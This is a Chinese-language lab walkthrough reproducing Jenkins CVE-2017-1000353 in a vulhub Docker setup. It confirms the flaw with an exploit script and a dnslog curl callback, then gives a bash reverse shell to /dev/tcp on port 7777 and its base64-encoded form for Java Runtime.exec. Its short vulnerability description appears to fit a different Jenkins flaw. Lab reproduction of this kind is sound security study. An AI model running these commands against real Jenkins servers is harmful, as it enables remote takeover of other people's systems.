一、环境搭建：

进入镜像目录：

cd vulhub/jenkins/CVE-2017-1000353

启动环境：

docker-compose up -d

访问8080端口



二、漏洞简介：

允许用户通过URL PATH来调用一次public方法。由于这个过程没有做限制，攻击者可以构造一些特殊的PATH来执行一些敏感的Java方法

影响版本：

Jenkins Version <= 2.56

Jenkins LTS Version <= 2.46.1



三、漏洞复现：

1、利用dnslog验证漏洞：

平台地址：http://www.dnslog.cn/

python2 exp.py http://192.168.136.131:8080 "curl ekowyg.dnslog.cn"

提示执行success


dnslog成功收到数据，证明漏洞存在：




2、直接反弹shell：

bash一句话反弹payload：

bash -i >& /dev/tcp/192.168.136.129/7777 0>&1

这里值得注意的是，需要利用：http://www.jackson-t.ca/runtime-exec-payloads.html 进行编码，大部分java的漏洞反弹shell的payload都需要进行编码，编码结果如下：

bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzNi4xMjkvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}


然后直接利用脚本发送编码之后的payload：

python2 exp.py http://192.168.136.131:8080 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzNi4xMjkvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}"

执行结果：

如果执行报错的话，需要根据脚本的源码安装相关库，并且脚本是基于python2写的
